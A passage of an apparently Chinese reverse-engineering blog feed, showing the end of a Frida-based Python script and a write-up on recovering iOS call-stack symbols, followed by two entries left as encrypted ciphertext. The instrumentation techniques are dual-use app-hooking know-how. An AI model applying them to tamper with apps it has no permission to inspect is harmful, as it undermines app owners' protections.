__name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>andoid调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid调试深度总结/andoid调试深度总结/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-06-05T06:57:29.464Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android Auto.js脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-04-30T02:52:18.678Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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